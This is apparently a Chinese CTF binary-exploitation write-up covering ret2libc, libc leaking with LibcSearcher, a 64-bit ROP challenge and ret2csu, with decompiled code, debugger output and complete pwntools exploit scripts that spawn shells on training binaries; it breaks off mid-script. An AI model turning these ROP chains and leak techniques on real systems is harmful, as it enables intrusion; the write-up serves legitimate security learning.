__cdecl main(int argc, const char **argv, const char **envp)&#123;  char s[100]; // [esp+1Ch] [ebp-64h] BYREF  setvbuf(stdout, 0, 2, 0);  setvbuf(_bss_start, 0, 1, 0);  puts(&quot;Something surprise here, but I don&#x27;t think it will work.&quot;);  printf(&quot;What do you think ?&quot;);  gets(s);  return 0;&#125;\ngets函数很明显，肯定是要栈溢出，其他信息没多少，在函数列表中又找到一个secure函数，内容如下\nvoid secure()&#123;  unsigned int v0; // eax  int input; // [esp+18h] [ebp-10h] BYREF  int secretcode; // [esp+1Ch] [ebp-Ch]  v0 = time(0);  srand(v0);  secretcode = rand();  __isoc99_scanf(&amp;unk_8048760, &amp;input);  if ( input == secretcode )    system(&quot;no_shell_QQ&quot;);&#125;\n有system函数，但是里面的参数不是想要的，因为是动态链接库，可以直接掉system的plt，参数在f12中也没找到，这题重要的时候需要自己构建一个“&#x2F;bin&#x2F;sh”字符串，这个程序里因为是动态链接库，所有的运行函数都可以去调用，我们可以尝试使用gets函数自己构建一个，但是这得找程序中可以写的变量地址，在bss段中找到了一个buf2的变量，在bss中的变量都可写的，他的地址是0x0804A080。\n攻击思路使用gets函数把/bin/sh写入buf2,再把buf2传入system函数。\n溢出长度使用gdb调式，内容如下\n─────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────*EAX  0xffffd0ec ◂— &#x27;hello&#x27; EBX  0xf7f9ee34 (_GLOBAL_OFFSET_TABLE_) ◂— 0x223d2c /* &#x27;,=&quot;&#x27; */*ECX  0xf7fa08ac (_IO_stdfile_0_lock) ◂— 0 EDX  0 EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0 ESI  0x80486d0 (__libc_csu_init) ◂— push ebp EBP  0xffffd158 ◂— 0 ESP  0xffffd0d0 —▸ 0xffffd0ec ◂— &#x27;hello&#x27;*EIP  0x80486bf (main+119) ◂— mov eax, 0\n栈溢出位数应该是0xd158-0xd0ec+4&#x3D;112\n攻击脚本#!/usr/bin/pythonfrom pwn import *# 利用地址gets_plt = 0x08048460system_plt = 0x08048490buf2 = 0x0804A080sh = &quot;/bin/sh&quot;io = process(&quot;./ret2libc2&quot;)payload = flat([b&quot;a&quot; * 112, gets_plt,system_plt,buf2,buf2 ])io.sendline(payload)io.sendline(sh)io.interactive()\n上面这个脚本只是一次性攻击脚本，就是说这个脚本只是适用于当前，单反多一个命令他都无法执行，下面给一个可以执行多次的脚本，就是真正可以一直操控程序执行流\n##!/usr/bin/env pythonfrom pwn import *sh = process(&quot;./ret2libc2&quot;)gets_plt = 0x08048460system_plt = 0x08048490pop_ebx = 0x0804843Dbuf2 = 0x804A080payload = flat([b&quot;a&quot; * 112, gets_plt, pop_ebx, buf2, system_plt, 0x0, buf2])sh.sendline(payload)sh.sendline(b&quot;/bin/sh&quot;)sh.interactive()\n上面脚本多加了一个pop_ebx的内容，当执行完gets之后，他的栈和执行的过程是这样的执行完这一步就开始pop ebx了执行完pop_ebx之后顺带会把buf2弹出栈，走到system_plt，执行到这一步刚好也走到ret，一ret就执行到system了，后面也可以通过这个思路来去继续构造命令。\nret2libc3题目来源下载位置： https://github.com/scwuaptx/HITCON-Training/blob/cb60f23e444a0639c3872f205dd28cb04190de16/LAB/lab4/ret2libPS：内容来自于HITCON-Training\n文件类型┌──(root㉿Kali)-[~/Desktop/PWN/ret2libc3]└─# file ret2libret2lib: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID\\[sha1]=c74b2683d6d3b99439c3e04d6d81b233e6a3b1b6, not stripped\n动态链接库编译的ELF文件\n软件防护┌──(root㉿Kali)-[~/Desktop/PWN/ret2libc3]└─# checksec ret2lib[*] &#x27;/root/Desktop/PWN/ret2libc3/ret2lib&#x27;    Arch:       i386-32-little    RELRO:      Partial RELRO    Stack:      No canary found    NX:         NX enabled    PIE:        No PIE (0x8048000)    Stripped:   No\n只是开启了NX防护允许栈溢出，NX防护开启，PIE防护关闭\nIDA分析main函数内容如下\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  char **v4; // [esp+4h] [ebp-11Ch]  int v5; // [esp+8h] [ebp-118h]  char src[256]; // [esp+12h] [ebp-10Eh] BYREF  char buf[10]; // [esp+112h] [ebp-Eh] BYREF  const void **v8; // [esp+11Ch] [ebp-4h]  puts(&quot;###############################&quot;);  puts(&quot;Do you know return to library ?&quot;);  puts(&quot;###############################&quot;);  puts(&quot;What do you want to see in memory?&quot;);  printf(&quot;Give me an address (in dec) :&quot;);  fflush(stdout);  read(0, buf, 10u);  v8 = (const void **)strtol(buf, v4, v5);  See_something(v8);  printf(&quot;Leave some message for me :&quot;);  fflush(stdout);  read(0, src, 0x100u);  Print_message(src);  puts(&quot;Thanks you ~&quot;);  return 0;&#125;\n这里有一个问题，就是得绕过一个位置，那就是下面这两行\n......char **v4; // [esp+4h] [ebp-11Ch]int v5; // [esp+8h] [ebp-118h]char buf[10]; // [esp+112h] [ebp-Eh] BYREFconst void **v8; // [esp+11Ch] [ebp-4h]......v8 = (const void **)strtol(buf, v4, v5);See_something(v8);\n其中See_something的内容如下\nint __cdecl See_something(const void **a1)&#123;  return printf(&quot;The content of the address : %p\\n&quot;, *a1);&#125;\nstrtol在这里的作用是把字符串转换为长整型，然后传给See_something函数，他拿到之后把他当作一个内存地址输出内容了，这里如果是输入的buf2内容不是数字会报错，如果输入的内容在程序中不是字符串或者说是不能通过%p输出出来那就会报错，绕过这两个才可以继续操作，后面的代码内容是\n......char src[256]; // [esp+12h] [ebp-10Eh] BYREF......read(0, src, 0x100u);Print_message(src);puts(&quot;Thanks you ~&quot;);return 0;\n读了一0x100大小的数据，转换成10进制就是256大小，放到了src中，之后把这个src丢到了Print_message中，Print_message的内容如下\nint __cdecl Print_message(char *src)&#123;  char dest[56]; // [esp+10h] [ebp-38h] BYREF  strcpy(dest, src);  return printf(&quot;Your message is : %s&quot;, dest);&#125;\n栈溢出就发生在这个函数中，他竟然把src的内容复制到了dest中，dest这个大小只有56位，但是src的大小是256，这样就产生了栈溢出。\n攻击思路第一步绕过虽然可以使用随便一个地址进行绕过，但是他这里不是为了让单纯绕过的，因为是动态链接库运行的程序我们需要通过这个方法溢出一下真实的函数地址，然后计算便宜位置找到system()函数的位置。找到这个位置之后再根据提供的so文件计算出偏移地址，再根据本地的链接库和偏移的地址拿到真实的system()函数位置。拿到之后通过执行sh字符串拿到shell，sh字符串可以直接通过python中的elf.search来搜索，在程序本身是又sh相关的字符串的，位置是在0x0804829A,他是fflush函数的名字,他的后缀有sh字样。\n溢出长度使用gdb进行调试，断点打开Print_message，让其一直运行到strcpy之后，再去查看dest到ebp的位数，gdb调试返回内容如下\npwndbg&gt; n0x08048568 in Print_message ()LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA───────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────────────────────────────────────────── EAX  0xffffcff0 ◂— &#x27;nihao\\n&#x27; EBX  0xf7f9ee34 (_GLOBAL_OFFSET_TABLE_) ◂— 0x223d2c /* &#x27;,=&quot;&#x27; */ ECX  0xffffd042 ◂— &#x27;nihao\\n&#x27;*EDX  0xffffcff0 ◂— &#x27;nihao\\n&#x27; EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0 ESI  0x8048670 (__libc_csu_init) ◂— push ebp EBP  0xffffd028 —▸ 0xffffd158 ◂— 0 ESP  0xffffcfe0 —▸ 0xffffcff0 ◂— &#x27;nihao\\n&#x27;*EIP  0x8048568 (Print_message+24) ◂— lea eax, [ebp - 0x38]─────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / i386 / set emulate on ]─────────────────────────────────────────────────────────────────────────────────────────────────────   0x8048556 &lt;Print_message+6&gt;     mov    eax, dword ptr [ebp + 8]     EAX, [0xffffd030] =&gt; 0xffffd042 ◂— &#x27;nihao\\n&#x27;   0x8048559 &lt;Print_message+9&gt;     mov    dword ptr [esp + 4], eax     [0xffffcfe4] =&gt; 0xffffd042 ◂— &#x27;nihao\\n&#x27;   0x804855d &lt;Print_message+13&gt;    lea    eax, [ebp - 0x38]            EAX =&gt; 0xffffcff0 —▸ 0xf7f9e7a8 (_IO_file_jumps) ◂— 0   0x8048560 &lt;Print_message+16&gt;    mov    dword ptr [esp], eax         [0xffffcfe0] =&gt; 0xffffcff0 —▸ 0xf7f9e7a8 (_IO_file_jumps) ◂— 0   0x8048563 &lt;Print_message+19&gt;    call   strcpy@plt                  &lt;strcpy@plt&gt; ► 0x8048568 &lt;Print_message+24&gt;    lea    eax, [ebp - 0x38]              EAX =&gt; 0xffffcff0 ◂— 0x6168696e (&#x27;niha&#x27;)   0x804856b &lt;Print_message+27&gt;    mov    dword ptr [esp + 4], eax       [0xffffcfe4] =&gt; 0xffffcff0 ◂— 0x6168696e (&#x27;niha&#x27;)   0x804856f &lt;Print_message+31&gt;    mov    dword ptr [esp], 0x8048721     [0xffffcfe0] =&gt; 0x8048721 ◂— pop ecx /* &#x27;Your message is : %s&#x27; */   0x8048576 &lt;Print_message+38&gt;    call   printf@plt                  &lt;printf@plt&gt;   0x804857b &lt;Print_message+43&gt;    leave   0x804857c &lt;Print_message+44&gt;    ret\n重点内容是在这段\n EAX  0xffffcff0 ◂— &#x27;nihao\\n&#x27; EBX  0xf7f9ee34 (_GLOBAL_OFFSET_TABLE_) ◂— 0x223d2c /* &#x27;,=&quot;&#x27; */ ECX  0xffffd042 ◂— &#x27;nihao\\n&#x27;*EDX  0xffffcff0 ◂— &#x27;nihao\\n&#x27; EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0 ESI  0x8048670 (__libc_csu_init) ◂— push ebp EBP  0xffffd028 —▸ 0xffffd158 ◂— 0 ESP  0xffffcfe0 —▸ 0xffffcff0 ◂— &#x27;nihao\\n&#x27;*EIP  0x8048568 (Print_message+24) ◂— lea eax, [ebp - 0x38]\n0xffffcff0是dest的位置，0xffffd028是ebp的位置计算出相差位数是56，这里需要+4因为要溢出到返回地址，所以溢出位数是60\n攻击脚本#!/usr/bin/pythonfrom pwn import *# 利用地址got_puts_address = &quot;134520860&quot;puts_address = 0x0io = process(&quot;./ret2libc3&quot;)elf = ELF(&quot;/usr/lib32/libc.so.6&quot;)elfio = ELF(&quot;./ret2libc3&quot;)io.sendlineafter(b&quot; :&quot;,got_puts_address)io.recvuntil(b&quot; : &quot;)# DROP的意思是是否丢掉换行符,拿到的是puts在执行环境中的位置，在去本地环境中拿到puts的地址相减，就可以拿到puts在本地环境和运行环境的偏移量put_address_cheap = int(io.recvuntil(b&quot;\\n&quot;,drop=True),16) - elf.symbols[&quot;puts&quot;]payload = flat([            b&quot;a&quot; * 60,            put_address_cheap+elf.symbols[&#x27;system&#x27;],            # 0xdeadbeef,            b&quot;a&quot;*4,            next(elfio.search(b&quot;sh\\x00&quot;))        ])# elfio.search返回的是一个迭代器，需要用next来一次性都拿到，这里是拿到&quot;sh&quot;字符串的地址# next(elfio.search(b&quot;sh\\x00&quot;))io.sendline(payload)io.interactive()\n也可以通过下面这个来去做，下面的这个不需要手动去找got表\nfrom pwn import *elf = ELF(&quot;./libc-2.31.so&quot;)elfio = ELF(&quot;./ret2libc3&quot;)io = remote(&quot;pod.ctf.wlaq&quot;, &quot;30892&quot;)puts_got_addr = elfio.got[&quot;puts&quot;]io.sendlineafter(b&quot; :&quot;, str(puts_got_addr))io.recvuntil(b&quot; :&quot;)offset = int(io.recvuntil(b&quot;\\n&quot;, drop=True), 16) - elf.symbols[&quot;puts&quot;]payload = flat(    [        b&quot;a&quot; * 60,        elf.symbols[&quot;system&quot;] + offset,        b&quot;a&quot; * 4,        next(elfio.search(b&quot;sh\\x00&quot;)),    ])print(payload)io.sendlineafter(b&quot; :&quot;, payload)io.interactive()\nret2libc3-search_libc题目来源下载位置： https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc3/ret2libc3PS：内容来自于CTF-WIKI\n文件类型(pwn) ┌──(kali㉿kali)-[~/pwn/ret2libc3-libc?]└─$ file ret2libc3 ret2libc3: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=c0ad441ebd58b907740c1919460c37bb99bb65df, with debug_info, not stripped\n这是一个次啊用动态链接库编译的32位EILF文件\n软件防护(pwn) ┌──(kali㉿kali)-[~/pwn/ret2libc3-libc?]└─$ checksec ret2libc3 [*] &#x27;/home/kali/pwn/ret2libc3-libc?/ret2libc3&#x27;    Arch:       i386-32-little    RELRO:      Partial RELRO    Stack:      No canary found    NX:         NX enabled    PIE:        No PIE (0x8048000)    Stripped:   No    Debuginfo:  Yes\nNX是开启的，PIE关闭，这基本就是代表了不能自己写入命令去执行。但是可以拿到对应bss、text、data相关的一些固定信息。\nIDA分析简单看了一下，ida中main函数内容如下然后还有一个secure函数，里面没有有帮助的内容，如下然后ida中还有一个bss buf2可以用，但是那个似乎只能在低版本内核中使用，这里就不考虑了。其他有用信息基本没有。。\n攻击思路根据ida的内容，主要围绕main函数进行，这里只有一个栈溢出漏洞存在，并且没有system函数和sh字符串可以用，并且这道题目并没有给我们libc库，我们需要通过自己构造执行流，在题目系统中，大概率是开启ASLR的，地址也随即，我们还需要通过自己构造的执行流是心啊反弹地址的一个功能，拿到地址通过特征去libc-database中寻找可能的libc版本，再去确定偏移然后通过偏移找到system的位置，到这一步之后我们还可以通过构造执行流去获取一个sh字符串，或者说是从程序、libc中拿到一个sh字符串。\n溢出位数使用pwndbg调试，查看位数的位置应该是在gets函数执行过后，内如如下\n─────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────*EAX  0xffffd10c ◂— &#x27;hello&#x27; EBX  0xf7f9ce14 (_GLOBAL_OFFSET_TABLE_) ◂— 0x235d0c /* &#x27;\\x0c]#&#x27; */*ECX  0xf7f9e8ac (_IO_stdfile_0_lock) ◂— 0 EDX  0 EDI  0xf7ffcb60 (_rtld_global_ro) ◂— 0 ESI  0x80486a0 (__libc_csu_init) ◂— push ebp EBP  0xffffd178 ◂— 0 ESP  0xffffd0f0 —▸ 0xffffd10c ◂— &#x27;hello&#x27;*EIP  0x804868f (main+119) ◂— mov eax, 0\n0xffffd178-0xffffd10c&#x3D;108+4&#x3D;112\n攻击脚本elf = ELF(&quot;./ret2libc3&quot;)pop_ebp_addr = 0x080486FFpayload = flat(    [        b&quot;a&quot; * 112,        elf.plt[&quot;puts&quot;],        pop_ebp_addr,        elf.got[&quot;puts&quot;],        elf.symbols[&quot;main&quot;],    ])\n这里干了三件事，首先溢出并且通过puts函数把puts函数真实在内存中的地址输出出来，然后栈平衡一下继续重新运行mian函数。拿到这个地址之后可以通过libcsearch这个库去搜索对应的libc库具体代码如下\nio.sendlineafter(b&quot;!?&quot;, payload)libc_start_main_leak = io.recvline()leak_bytes = libc_start_main_leak[:4]addr = u32(leak_bytes)print(hex(addr))libc = LibcSearcher(&quot;puts&quot;, addr)offset = addr - libc.dump(&quot;puts&quot;)\n上面的操作是拿到地址之后去libcsearch中搜索对应可能的libc，在ASLR中，他的偏移范围都是按照页的倍数去虚拟化内存地址的，一个页就是4096，4096的16进制是1000，所以后面的三位就不会变化，libcsearch就是通过这个后三位去模糊匹配。运行的时候他会弹出一个选择框，如下图这些都是有可能的libc库，但是因为libcsearch好久没有更新了，而且libc都是7年前的了，只有老版本的这种题目可以使用，新版本的libc可以去libc-database项目区查询。最终通过猜到的libc拿到对应的偏移区去尝试工具，因为上面组装的payload继续运行了main，就是说我们还可以继续溢出，再次构建一个payload，代码如下\npayload2 = flat(    [        b&quot;a&quot; * 112,        libc.dump(&quot;system&quot;) + offset,        0xDEADBEEF,        libc.dump(&quot;str_bin_sh&quot;) + offset,    ])\n这里继续溢出了112，因为上面咱们通过pop_ebp_addr栈平衡了一下，所以偏移不会变，后续通过模糊搜索的libc中的system函数+偏移去执行它，后面的参数也是通过libc去查找。完整的攻击脚本如下\nfrom pwn import *from LibcSearcher import LibcSearcherio = remote(&quot;pod.ctf.wlaq&quot;, &quot;30922&quot;)elf = ELF(&quot;./ret2libc3&quot;)pop_ebp_addr = 0x080486FFpayload = flat(    [        b&quot;a&quot; * 112,        elf.plt[&quot;puts&quot;],        pop_ebp_addr,        elf.got[&quot;puts&quot;],        elf.symbols[&quot;main&quot;],    ])io.sendlineafter(b&quot;!?&quot;, payload)puts_leak = io.recvline()leak_bytes = puts_leak[:4]addr = u32(leak_bytes)print(hex(addr))libc = LibcSearcher(&quot;puts&quot;, addr)offset = addr - libc.dump(&quot;puts&quot;)payload2 = flat(    [        b&quot;a&quot; * 112,        libc.dump(&quot;system&quot;) + offset,        0xDEADBEEF,        libc.dump(&quot;str_bin_sh&quot;) + offset,    ])io.sendline(payload2)io.interactive()\n这里要注意的是，如果运行题目的libc版本太高，通过libcsearch估计是做不出来的，得自己通过libc-database项目去找。\nCTF-WIKI-EXP分析去分析一下ctf-wiki提供的exp，代码如下\n#!/usr/bin/env pythonfrom pwn import *from LibcSearcher import LibcSearchersh = process(&#x27;./ret2libc3&#x27;)ret2libc3 = ELF(&#x27;./ret2libc3&#x27;)puts_plt = ret2libc3.plt[&#x27;puts&#x27;]libc_start_main_got = ret2libc3.got[&#x27;__libc_start_main&#x27;]main = ret2libc3.symbols[&#x27;main&#x27;]print(&quot;leak libc_start_main_got addr and return to main again&quot;)payload = flat([b&#x27;A&#x27; * 112, puts_plt, main, libc_start_main_got])sh.sendlineafter(b&#x27;Can you find it !?&#x27;, payload)print(&quot;get the related addr&quot;)libc_start_main_addr = u32(sh.recv()[0:4])libc = LibcSearcher(&#x27;__libc_start_main&#x27;, libc_start_main_addr)libcbase = libc_start_main_addr - libc.dump(&#x27;__libc_start_main&#x27;)system_addr = libcbase + libc.dump(&#x27;system&#x27;)binsh_addr = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)print(&quot;get shell&quot;)payload = flat([b&#x27;A&#x27; * 104, system_addr, 0xdeadbeef, binsh_addr])sh.sendline(payload)sh.interactive()\n主要的区别在于他后面的溢出是104位，原因是因为它第一次溢出构造反弹真实函数地址的时候，他没有进行栈平衡，代码如下\npayload = flat([b&#x27;A&#x27; * 112, puts_plt, main, libc_start_main_got])\n这里他返回地址直接填到了mian，运行完puts直接执行main，当它这个main执行的时候，栈内的数据应该是空的，然后因为函数调用他会把ebp压栈，所以会多一个4的位置，然后继续开辟一个位置为100的s\nchar s[100]\n那么esp的位置距离ret就是104，所以第二个payload需要溢出104。\nx86(32位)与x64(64位)的区别x86的函数传参都是保存在栈上面的，而x64的前六个参数都是存放在寄存器中的，依次为RDI、RSI、RDX、RCX、R8、R9中，如果参数大于6个，那么就存放在栈中，然后32位的地址都是占用32个字节(16进制就是4位)，64位的是占用64字节(16位就是8位)，在计算偏移的时候需要注意这一点。\njarvisoj_level3题目来源buuctf: https://buuoj.cn/challenges#jarvisoj_level3_x64PS：这道题目我看教程(星盟培训)是给libc的，然后其实libc这个东西给不给都能做，具体就是通过libcsearch挨个试，后面的脚本会有俩版本，一个有libc的一个没有的。\n文件类型(pwn) ┌──(kali㉿kali)-[~/pwn/level9]└─$ file attachmentattachment: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=f01f8fd41061f9dafb9399e723eb52d249a9b34d, not stripped\n动态链接库编译的ELF文件\n软件防护(pwn) ┌──(kali㉿kali)-[~/pwn/level9]└─$ checksec attachment[*] &#x27;/home/kali/pwn/level9/attachment&#x27;    Arch:       amd64-64-little    RELRO:      No RELRO    Stack:      No canary found    NX:         NX enabled    PIE:        No PIE (0x400000)    Stripped:   No\n除了nx基本都关闭。\nIDA分析main函数内容如下\nint __fastcall main(int argc, const char **argv, const char **envp)&#123;  vulnerable_function(argc, argv, envp);  return write(1, &quot;Hello, World!\\n&quot;, 0xEuLL);&#125;\n主要看vulnerable_function，vulnerable_function内容如下\nssize_t vulnerable_function()&#123;  char buf[128]; // [rsp+0h] [rbp-80h] BYREF  write(1, &quot;Input:\\n&quot;, 7uLL);  return read(0, buf, 0x200uLL);&#125;\n其他的基本没啥有用信息，主要有用信息就是一个栈溢出，buf只有128的位置，然后读入了一个0x200的数据。\n攻击思路这题目除了栈溢出漏洞其他有用信息都没有，栈溢出可以控制程序执行流，这种情况应该只能通过got与libc算偏移，拿到system函数地址，通过libc中找sh去设置system函数的参数。找偏移我们需要让他先把当got表的某个函数的地址泄露出来，拿到它运行的真实地址。在他的程序中可以通过write来回显消息，我们也可以通过它去泄露got地址，因为是64位的程序，前6个参数都得放到寄存器中，我们需要通过gadget去看是否可以通过弹栈的方式去设置参数，能用的gadget如下\n(pwn) ┌──(kali㉿kali)-[~/pwn/level9]└─$ ROPgadget --binary attachment --only &quot;pop|ret&quot;Gadgets information============================================================0x00000000004006ac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004006ae : pop r13 ; pop r14 ; pop r15 ; ret0x00000000004006b0 : pop r14 ; pop r15 ; ret0x00000000004006b2 : pop r15 ; ret0x00000000004006ab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004006af : pop rbp ; pop r14 ; pop r15 ; ret0x0000000000400550 : pop rbp ; ret0x00000000004006b3 : pop rdi ; ret0x00000000004006b1 : pop rsi ; pop r15 ; ret0x00000000004006ad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400499 : retUnique gadgets found: 11\n去构造一个泄露got的write指令，具体能用的gadget如下\n# 平衡pop_rbp_addr = 0x400550# 第一个参数pop_rdi_addr = 0x4006B3# 第二个参数pop_rsi_r15_addr = 0x4006B1\nwrite需要三个参数，第一个是写入位置，第二个是写入的内容，第三个是写入的数量，我们这里只能拿到前两个参数的gadget，遇到这种情况只能试试了，有些时候他这个寄存器中可能本身就存在值，我们不需要设置也可以用，在read函数中我们触发栈溢出的时候，应该是有值的这里edx是200h，我估计会使用这个，因为栈溢出之后也没有清除他，好我们继续，第一个和第二个参数设置好之后我们需要直接运行write，直接使用got的地址即可，然后输出了之后我们还需要让他继续运行，具体方法就是直接让其运行main函数，让我们可以继续去栈溢出，第一个payload就构造好了具体如下\nefl = ELF(&quot;./level3_x64&quot;)# 平衡pop_rbp_addr = 0x400550# 第一个参数pop_rdi_addr = 0x4006B3# 第二个参数pop_rsi_r15_addr = 0x4006B1# mainmain_addr = 0x40061Apayload = flat(    [        b&quot;a&quot; * 136,        p64(pop_rdi_addr),        p64(1),        p64(pop_rsi_r15_addr),        p64(elf.got[&quot;write&quot;]),        p64(0),        p64(elf.plt[&quot;write&quot;]),        p64(pop_rbp_addr),        p64(0),        p64(elf.symbols[&quot;main&quot;]),    ])\n溢出位数这里不多说，可以直接在ida或者动调去看。这个payload会让程序输出write函数在执行的实际地址，然后继续运行main函数。我们通过下面函数去读取回显，程序会写入两次内容，我们一次性接收给他截断，并且补0(-6是因为第一次数据我们没有结束他会输出一个Input:\\n)\naddr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8, b&quot;\\x00&quot;))\n返回的write地址我们通过libcsearch去查询，具体代码如下\nlibc = LibcSearcher(&quot;write&quot;, addr)offset = addr - libc.dump(&quot;write&quot;)\n查询之后我们组装第二个payload，具体就是偏移也查出来了，直接去执行system即可，binsh可以直接从libc中寻找，代码如下\npayload = flat(    [        b&quot;a&quot; * 136,        p64(pop_rdi_addr),        p64(libc.dump(&quot;str_bin_sh&quot;) + offset),        p64(libc.dump(&quot;system&quot;) + offset),    ])\n攻击脚本完整的攻击脚本如下\nfrom pwn import *from LibcSearcher import LibcSearcherio = process(&quot;./level3_x64&quot;)efl = ELF(&quot;./level3_x64&quot;)# 平衡pop_rbp_addr = 0x400550# 第一个参数pop_rdi_addr = 0x4006B3# 第二个参数pop_rsi_r15_addr = 0x4006B1# mainmain_addr = 0x40061Apayload = flat(    [        b&quot;a&quot; * 136,        p64(pop_rdi_addr),        p64(1),        p64(pop_rsi_r15_addr),        p64(elf.got[&quot;write&quot;]),        p64(0),        p64(elf.plt[&quot;write&quot;]),        p64(pop_rbp_addr),        p64(0),        p64(elf.symbols[&quot;main&quot;]),    ])io.sendline(payload)addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8, b&quot;\\x00&quot;))libc = LibcSearcher(&quot;write&quot;, addr)offset = addr - libc.dump(&quot;write&quot;)payload = flat(    [        b&quot;a&quot; * 136,        p64(pop_rdi_addr),        p64(libc.dump(&quot;str_bin_sh&quot;) + offset),        p64(libc.dump(&quot;system&quot;) + offset),    ])io.sendline(payload)io.interactive()\n然后再附上一个题目给libc的脚本\nfrom pwn import *# from LibcSearcher import LibcSearcherio = process(&quot;./level3_x64&quot;)elf = ELF(&quot;./level3_x64&quot;)libc = ELF(&quot;./libc-2.23.so&quot;)# 平衡pop_rbp_addr = 0x400550# 第一个参数pop_rdi_addr = 0x4006B3# 第二个参数pop_rsi_r15_addr = 0x4006B1payload = flat(    [        b&quot;a&quot; * 136,        p64(pop_rdi_addr),        p64(1),        p64(pop_rsi_r15_addr),        p64(elf.got[&quot;write&quot;]),        p64(0),        p64(elf.plt[&quot;write&quot;]),        p64(pop_rbp_addr),        p64(0),        p64(elf.symbols[&quot;main&quot;]),    ])print(io.recvline())io.sendline(payload)addr = u64(io.recvline()[:8])print(&quot;============&quot;)print(addr)print(libc.symbols[&quot;write&quot;])print(&quot;============&quot;)offset = addr - libc.symbols[&quot;write&quot;]payload = flat(    [        b&quot;a&quot; * 136,        p64(pop_rdi_addr),        p64(next(libc.search(b&quot;/bin/sh\\x00&quot;)) + offset),        p64(libc.symbols[&quot;system&quot;] + offset),    ])io.sendline(payload)io.interactive()\n具体区别就是我这里接收了输出，第二次我只需要截取前8位即可。然后就是偏移，libc直接计算即可。\n进阶栈溢出ret2csu漏洞实现在64位程序中，只要是引用了libc.so就会有csu相关的代码，有一个__libc_csu_init函数，具体作用是给libc做初始化，他具体执行的内容如下重点在于后面两个框出来的位置，在第一个中它通过r15、r14、r13分别给rdx、rsi、edi进行传参数，相当于控制了一个函数调用的前3个变量，紧接着就直接执行了call，但是call的位置有点说法，他call的是r12+rbx*8位置的函数，我们如果想要利用基本就要把rbx控制为0，让其直接调用r12寄存器中的内容。在第二个函数中它通过栈中的数据给rbx、rbp、r12、r13、r14、r15赋了值，然后最后进行了ret。我们只要造成了栈溢出并且可以做到控制一个执行流，我们就可以通过这个做到任意函数调用，当然调用的前提我们需要算出函数的迁移。具体的攻击流程就是通过loc_400606从栈中拿数据，要重点控制的寄存器是rbx、r12-15，然后再ret的时候ret到loc_4005F0中，这样就可以直接去执行我们构造的call。除函数外，rbx需要重点控制，他最好设置成0，不然call的位置会比较难找。还有就是当前第二个他是通过mov6个基于rsp的偏移位置给寄存器值，最后给rsp+了38h的位置其实这里就可以理解为每一条mov都是在pop，有些版本的这里会直接显示pop，没有add rsp,38h。\n题目来源题目下载： https://github.com/zhengmin1989/ROP_STEP_BY_STEP/blob/master/linux_x64/level5题目来源： https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/medium-rop/#_2\n文件类型(pwn) ┌──(root㉿BoyChaiWindows)-[/mnt/e/TEMP/新建文件夹]└─# file level5level5: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=d9f08d31d3b1e53bf52a4206c99f0ad5b61541f6, not stripped\n64位，动态链接\n软件防护(pwn) ┌──(root㉿BoyChaiWindows)-[/mnt/e/TEMP/新建文件夹]└─# checksec level5[*] &#x27;/mnt/e/TEMP/新建文件夹/level5&#x27;    Arch:       amd64-64-little    RELRO:      Partial RELRO    Stack:      No canary found    NX:         NX enabled    PIE:        No PIE (0x400000)    Stripped:   No\n没开pie，没有金丝雀、就开了一个nx，很常规的防护，很显然这就是要用栈溢出进行攻击\nIDA分析main函数中的内容如下\nint __fastcall main(int argc, const char **argv, const char **envp)&#123;  write(1, &quot;Hello, World\\n&quot;, 0xDuLL);  return vulnerable_function();&#125;\n没什么重点内容，主要是vulnerable_function函数，内容如下\nssize_t vulnerable_function()&#123;  char buf[128]; // [rsp+0h] [rbp-80h] BYREF  return read(0, buf, 0x200uLL);&#125;\n这里就直接是一个栈溢出漏洞，其他的基本没内容，但是在函数列表中找到了__libc_csu_init。然后还在bss中找到了一块可以用的位置\n攻击思路这个题目是没有libc的我们需要通过csu构造一个write，输出某个函数的地址，计算偏移，然后继续通过csu构造一个read，写入一个sh，然后再次构造一个csu把binsh写入bss中，最后再次通过csu执行system拿bash。\n攻击脚本from pwn import *context.log_level = &quot;debug&quot;context.terminal = [&quot;cmd.exe&quot;, &quot;/c&quot;, &quot;start&quot;, &quot;cmd.exe&quot;, &quot;/c&quot;, &quot;wsl.exe&quot;, &quot;-e&quot;]io = process(&quot;./level5&quot;)elf = ELF(&quot;./level5&quot;)rdx_rsi_edi_call = 0x4005F0rbx_rbp_r12_r13_r14_r15_ret = 0x400606bss_addr = 0x601028main_addr = 0x400564def csu(arg1, arg2, arg3, call):    payload = flat(        [            b&quot;\\x00&quot; * 136,            p64(rbx_rbp_r12_r13_r14_r15_ret),            p64(0),  # 补38-30            p64(0),  # rbx 最好是0            p64(1),  # rbp 下面内容中他必须为1才不会重复的去循环            p64(call),  # r12 call            p64(arg1),  # 13  rdi            p64(arg2),  # r14 rsi            p64(arg3),  # r15 rdx            p64(rdx_rsi_edi_call),  # ret            b&quot;\\x00&quot; * 56,  # 需要步38H即56            p64(main_addr),        